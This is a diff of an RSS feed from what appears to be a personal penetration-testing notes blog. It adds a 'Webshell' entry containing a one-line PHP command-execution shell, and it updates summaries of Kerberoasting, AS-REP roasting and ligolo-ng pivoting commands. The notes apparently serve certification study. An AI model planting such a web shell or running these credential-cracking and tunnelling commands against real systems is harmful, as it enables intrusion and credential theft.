@@ -3,17 +3,24 @@
   <channel>
     <title>Posts :: Zenu</title>
     <link>http://localhost:1313/posts/index.html</link>
-    <description>Cheat Sheets &amp; Tips&#xA;Active Directory Cheatsheet File Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest</description>
+    <description>Cheat Sheets &amp; Tips&#xA;Active Directory Cheatsheet File Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest Webshell</description>
     <generator>Hugo</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 28 Apr 2026 20:19:35 +0900</lastBuildDate>
+    <lastBuildDate>Sun, 02 Aug 2026 23:34:58 +0900</lastBuildDate>
     <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Webshell</title>
+      <link>http://localhost:1313/posts/webshell/index.html</link>
+      <pubDate>Sun, 02 Aug 2026 23:34:58 +0900</pubDate>
+      <guid>http://localhost:1313/posts/webshell/index.html</guid>
+      <description>php &lt;?php system($_GET[&#34;cmd&#34;]);?&gt;</description>
+    </item>
     <item>
       <title>Cheatsheet</title>
       <link>http://localhost:1313/posts/oscp_cheatsheet/index.html</link>
       <pubDate>Tue, 28 Apr 2026 20:19:35 +0900</pubDate>
       <guid>http://localhost:1313/posts/oscp_cheatsheet/index.html</guid>
-      <description>Kerberos Kerberoasting (service account) linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat hashcat:&#xA;hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule&#xA;AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:hash.txt linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70 hashcat:</description>
+      <description>Kerberos Kerberoasting (service account) linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat hashcat:&#xA;hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule&#xA;AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:hash.txt linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70 with userfile option (when only usernames are known) impacket-GetNPUsers shadow.gate/ -format hashcat -usersfile users.txt -request -dc-ip 10.0.26.64 hashcat:</description>
     </item>
     <item>
       <title>Active Directory</title>
@@ -34,7 +41,7 @@
       <link>http://localhost:1313/posts/pivoting/index.html</link>
       <pubDate>Mon, 23 Feb 2026 11:11:32 +0900</pubDate>
       <guid>http://localhost:1313/posts/pivoting/index.html</guid>
-      <description>ligolo-ng Set a proxy server sudo ./proxy -selfcert -laddr &#34;0.0.0.0:7878&#34;&#xA;Create an interface interface_create --name &#34;evil-cha&#34;&#xA;Add route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24&#xA;Access to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert&#xA;Check sessions from the proxy sessoins&#xA;Start tunneling tunnel_start --tun evil-cha&#xA;For local port forwarding.&#xA;from kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha</description>
+      <description>ligolo-ng Set a proxy server sudo ligolo-proxy -selfcert -laddr &#34;0.0.0.0:7878&#34;&#xA;Create an interface interface_create --name &#34;evil-cha&#34;&#xA;Add route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24&#xA;Access to the proxy server from the target machine ./agent -connect 192.168.45.224:7878 -ignore-cert&#xA;Check sessions from the proxy sessoin&#xA;Start tunneling tunnel_start --tun evil-cha&#xA;For local port forwarding.&#xA;Make sure the tunnel has started</description>
     </item>
     <item>
       <title>File Transfer</title>
